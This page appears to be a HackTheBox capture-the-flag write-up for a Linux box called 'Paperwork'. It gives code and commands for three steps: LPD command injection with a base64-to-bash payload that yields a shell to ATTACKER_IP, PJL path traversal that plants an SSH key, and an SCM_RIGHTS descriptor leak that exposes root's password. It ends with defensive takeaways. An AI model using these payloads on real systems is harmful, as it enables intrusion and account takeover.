@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paperwork Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">rahul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+      <button id="theme-toggle" class="theme-toggle" type="button">☀</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      paperwork
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">Paperwork</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-easy">Easy</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-07-19</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Linux — Ubuntu 25.10</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Stack</td>
+        <td style="padding:4px 0;color:var(--text);">nginx 1.28.0 + bespoke Python 3.13 RFC 1179 (LPD) &amp; PJL/JetDirect services</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Vulns</td>
+        <td style="padding:4px 0;color:var(--green);">Command Injection (LPD) &nbsp;·&nbsp; Path Traversal (PJL) &nbsp;·&nbsp; SCM_RIGHTS FD Leak</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>Paperwork is a print-queue-themed box built entirely on bespoke Python services rather than off-the-shelf software:</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>Initial access</strong> — a custom RFC&nbsp;1179 line-printer daemon interpolates the print job's name straight into a <code>shell=True</code> command with no sanitisation. A crafted control file gives command execution as <code>lp</code>.</li>
+      <li style="margin-bottom:6px;"><strong>Lateral movement</strong> — a hand-rolled JetDirect/PJL emulator on a loopback-only port has an unrestricted path-traversal bug in its virtual filesystem layer, letting <code>lp</code> read and write arbitrary files as <code>archivist</code>. Planting an SSH key gives a clean foothold.</li>
+      <li style="margin-bottom:6px;"><strong>Privilege escalation</strong> — a root-owned "security" watchdog leaks a live, already-privileged file descriptor over a Unix socket via <code>SCM_RIGHTS</code> once it detects PJL filesystem abuse in a log file. The leaked secret turns out to be root's own login password.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+    <pre>nmap -sC -sV -p- 10.129.43.246
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH (Ubuntu)
+80/tcp   open  http    nginx 1.28.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://paperwork.htb/
+1515/tcp open  printer RFC 1179 - Line Printer Daemon protocol</pre>
+    <p>Nmap fingerprints port <code>1515</code> as a Line Printer Daemon speaking RFC&nbsp;1179 — a non-standard port for what's normally 515/tcp. Port 80 redirects to a vhost:</p>
+    <pre>echo '10.129.43.246  paperwork.htb' | sudo tee -a /etc/hosts</pre>
+    <p>The site is an "Intake Portal" that spells out the printer setup in plain text:</p>
+    <pre>Protocol         Compliance Level: RFC 1179
+Target Queue     archive_intake
+Internal Processor  paperwork-archive-v1.02  (/download/archive)</pre>
+    <p>A "management console" is mentioned as offline, with the LPD gateway as the active fallback — and the page links directly to the LPD daemon's own source.</p>
+
+    <h2>Initial Access — LPD Command Injection</h2>
+    <p>Downloading <code>/download/archive</code> gives <code>server.py</code>, the RFC 1179 daemon listening on 1515. The distributed copy has a couple of unrelated bugs (a missing <code>import os</code>, a broken indentation block) that need patching to get a runnable reference — but the vulnerable sink is intact. The control file's <code>J</code> line (the job name) goes straight into a shell string:</p>
+    <pre>def handle_print_job(self, data):
+    queue = data[1:].decode().strip()
+    if queue not in VALID_QUEUE:          # VALID_QUEUE defaults to "archive_intake"
+        self.sock.send(b'\x01')
+        return
+    ...
+    job_name = "Unknown"
+    for line in decoded_content.split('\n'):
+        line = line.strip()
+        if line.startswith('J'):
+            job_name = line[1:]
+            break
+
+    subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)</pre>
+    <p>No sanitisation on <code>job_name</code> — breaking out of the single quotes gives arbitrary shell syntax. The exploit speaks just enough RFC 1179 to reach that sink: a receive-job command for the <code>archive_intake</code> queue, a receive-control-file subcommand, then the control file itself with a poisoned <code>J</code> line (base64-wrapped to dodge further quoting issues):</p>
+    <pre>H&lt;rhost&gt;
+P root
+Jx'; echo &lt;base64 payload&gt; | base64 -d | bash #</pre>
+    <p>The daemon runs <code>echo 'Archive: x'; echo &lt;payload&gt; | base64 -d | bash #' &gt;&gt; /tmp/archive.log</code> — the injected command executes under <code>shell=True</code>.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">initial foothold</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">python3 exploit.py 10.129.43.246 --lhost ATTACKER_IP --lport 9001</span></div>
+        <div class="t-out">[+] Control file sent -&gt; payload should fire on the target</div>
+        <div class="t-success">lp@paperwork:/$ id</div>
+        <div class="t-out">uid=7(lp) gid=7(lp) groups=7(lp)</div>
+      </div>
+    </div>
+
+    <h2>Local Enumeration</h2>
+    <p>Process listing (via <code>/proc/&lt;pid&gt;/cmdline</code>) turns up three more Python services that never showed up in the external nmap scan:</p>
+    <pre>archivist  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ .../commands.log
+root       /usr/bin/python3 /usr/bin/paperwork-daemon
+root       /usr/bin/python3 /root/staging/CorpoSite/app.py   # proxied by nginx on :80</pre>
+    <p><code>ss -tlnp</code> confirms <code>9100</code> and the app's <code>1337</code> are bound to <code>127.0.0.1</code> only — invisible externally, but reachable now that there's local code execution. <code>/usr/bin/paperwork-daemon</code> is <strong>world-readable</strong> despite running as root, so its logic — and the trust boundary it depends on — is available to read directly (covered under Privilege Escalation below). <code>lp</code>'s own group membership doesn't overlap with <code>archivist</code>, so a filesystem-level pivot isn't possible; the path has to go through one of these network services.</p>
+
+    <h2>Lateral Movement — lp → archivist via PJL Path Traversal</h2>
+    <p>Port 9100 is a hand-rolled JetDirect/PJL emulator. Since its source isn't directly readable as <code>lp</code>, the fastest way to see it is to make the service serve itself — its virtual filesystem root is exactly the directory <code>jetdirect.py</code> lives in, and its <code>FSUPLOAD</code> command reads files with no path restriction:</p>
+    <pre>exec 3&lt;&gt;/dev/tcp/127.0.0.1/9100
+printf '\x1b%%-12345X@PJL FSUPLOAD NAME="0:/jetdirect.py" OFFSET=0 SIZE=5119\r\n\x1b%%-12345X' &gt;&amp;3
+timeout 5 cat &lt;&amp;3 &gt; jetdirect_leak.bin</pre>
+    <p>The source confirms the bug — <code>Filesystem._translate()</code> strips the <code>"0:"</code> volume prefix but never blocks <code>..</code> segments before normalising the path:</p>
+    <pre>def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))</pre>
+    <p><code>listdir()</code>, <code>read()</code>, and <code>write()</code> all funnel through this — so <code>FSDIRLIST</code>, <code>FSUPLOAD</code>, and <code>FSDOWNLOAD</code> are all traversal-capable. Walking up from the service root confirms the escape and reaches <code>archivist</code>'s home directory, including an <strong>existing but empty</strong> <code>authorized_keys</code>:</p>
+    <pre>@PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=999
+# .ssh  user.txt  .bash_history  ...
+
+@PJL FSDIRLIST NAME="0:/../.ssh/" ENTRY=1 COUNT=999
+# authorized_keys TYPE=FILE SIZE=0</pre>
+    <p><code>FSDOWNLOAD</code> (the write path) makes parent directories as needed and opens the target for binary write — no restriction beyond the same traversal-vulnerable <code>_translate()</code>. A small script writes the attacker's public key byte-exact (SIZE has to match the payload precisely, so this is cleaner than juggling shell quoting):</p>
+    <pre>UEL = b"\x1b%-12345X"
+pubkey = b"ssh-ed25519 AAAA... user@kali\n"
+cmd = UEL + b'@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=%d\r\n' % len(pubkey)
+
+s = socket.create_connection(("127.0.0.1", 9100), timeout=5)
+s.sendall(cmd + pubkey + UEL)</pre>
+    <p>Note: the same traversal against <code>/root/root.txt</code> just returns <code>FILEERROR=1</code> — the read still executes with <code>jetdirect.py</code>'s real OS permissions (<code>archivist</code>), and <code>/root</code> is <code>0700 root:root</code>. The bug escapes the app's <em>logical</em> sandbox, not actual filesystem permissions.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">foothold as archivist</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">ssh -i id_ed25519 archivist@10.129.43.246</span></div>
+        <div class="t-success">archivist@paperwork:~$ id</div>
+        <div class="t-out">uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)</div>
+      </div>
+    </div>
+
+    <h2>Privilege Escalation — SCM_RIGHTS FD Leak &amp; Password Reuse</h2>
+    <p><code>paperwork-daemon</code> (world-readable, runs as root) listens on a Unix socket <code>/run/paperwork/mgmt.sock</code>, <code>chown(0, 1000)</code> / <code>chmod 0660</code> — root and the <code>archivist</code> group only. As plain <code>lp</code> it was unreachable; as <code>archivist</code> it's a direct connect. On every connection it checks the JetDirect log for signs of PJL filesystem abuse:</p>
+    <pre>def scan_for_malice():
+    with open(LOG_PATH) as f:
+        content = f.read().upper()
+        return any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"])</pre>
+    <p>The earlier traversal testing already filled that log with exactly those strings. If malice is flagged, the "lockdown" response does something drastic — it hands the connecting peer <strong>live file descriptors</strong> via ancillary <code>SCM_RIGHTS</code> data, including one opened as root at daemon startup against a secrets file:</p>
+    <pre>admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)   # opened as root at boot
+...
+def trigger_lockdown(conn):
+    log_fd = os.open(LOG_PATH, os.O_RDONLY)
+    evidence_bundle = array.array("i", [log_fd, admin_fd])
+    conn.sendmsg([b"ALERT: SECURITY_VIOLATION..."],
+                 [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])</pre>
+    <p>Whoever holds that descriptor can read the file regardless of their own permissions — the access check already happened, back when root opened it. A small client just has to connect and receive the ancillary data:</p>
+    <pre>s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(2 * 4))
+for level, type_, data in ancdata:
+    if type_ == socket.SCM_RIGHTS:
+        fds = array.array("i"); fds.frombytes(data)
+
+for fd in fds:
+    print(os.pread(fd, 4096, 0))</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">leaked secret</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">archivist@paperwork</span>:~$ <span class="t-cmd">python3 leak_admin.py</span></div>
+        <div class="t-out">message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'</div>
+        <div class="t-success">ADMIN_PASSWORD=ApparelMortuaryCedar22</div>
+      </div>
+    </div>
+
+    <p>No system account named <code>admin</code> exists, and a directory brute-force of <code>paperwork.htb</code> (4600+ requests, dirb's common list) turns up nothing beyond what the intake page already showed — so this isn't a web credential. It's simpler than that: it's root's own login password.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">root shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">archivist@paperwork</span>:~$ <span class="t-cmd">su - root</span></div>
+        <div class="t-out">Password: ApparelMortuaryCedar22</div>
+        <div class="t-success"># id</div>
+        <div class="t-success">uid=0(root) gid=0(root) groups=0(root)</div>
+      </div>
+    </div>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/archivist/user.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>Unsanitised job name interpolated into <code>subprocess.Popen(..., shell=True)</code> in the LPD daemon</td><td><span class="severity-critical">Critical</span></td><td>Unauthenticated RCE as <code>lp</code></td></tr>
+        <tr><td>Missing traversal check in the PJL/JetDirect virtual filesystem (<code>Filesystem._translate</code>)</td><td><span class="severity-critical">Critical</span></td><td>Arbitrary file read/write as <code>archivist</code></td></tr>
+        <tr><td><code>paperwork-daemon</code> leaks a root-opened file descriptor to any local peer via <code>SCM_RIGHTS</code></td><td><span class="severity-high">High</span></td><td>Discloses <code>admin_pins.conf</code> regardless of the reader's actual OS permissions</td></tr>
+        <tr><td>Password reuse — leaked <code>ADMIN_PASSWORD</code> doubles as root's OS login password</td><td><span class="severity-critical">Critical</span></td><td>Direct privilege escalation to root via <code>su</code></td></tr>
+      </tbody>
+    </table>
+
+    <h2>Defensive Takeaways</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>Never build shell commands with f-strings and <code>shell=True</code>.</strong> One unescaped quote in a print job name was full RCE. Use a fixed argument list with <code>shell=False</code>, or at minimum <code>shlex.quote()</code> anything interpolated.</li>
+      <li><strong>Path-sandbox checks must validate the resolved path, not just strip prefixes.</strong> <code>_translate()</code> removed <code>"0:"</code> and leading slashes but never rejected <code>..</code>, so <code>os.path.normpath</code> walked straight out of the intended root. After normalising, always confirm <code>os.path.commonpath([root, resolved]) == root</code>.</li>
+      <li><strong>Don't hand out live file descriptors as a "security" feature.</strong> A boolean "quarantine triggered" alert would have raised the alarm without also handing the reader four privileged reads. Anything received over <code>recvmsg()</code> should be treated as equivalent to a root shell into that fd's target.</li>
+      <li><strong>Group-restricted Unix sockets are only as trustworthy as every process in that group.</strong> <code>mgmt.sock</code> assumed only "legitimate" <code>archivist</code> code would ever connect — but <code>archivist</code>'s own JetDirect service was remotely exploitable, so the boundary collapsed the moment that service did. Loopback binding and group ACLs aren't isolation once local code execution exists anywhere in the chain — see my <a href="../blog/localhost-not-a-boundary.html">localhost-not-a-boundary</a> notes.</li>
+      <li><strong>Never reuse a secret across a config value and an OS account password.</strong> One leaked <code>ADMIN_PASSWORD</code> was root the whole way down because it was also root's <code>su</code> password. Rotate and scope secrets per consumer.</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    © 2026 <span>Rahul Sharma</span> &nbsp;·&nbsp; Security Engineer &nbsp;·&nbsp; HackTheBox writeups &amp; defensive security notes
+  </div>
+</footer>
+
+</body>
+</html>
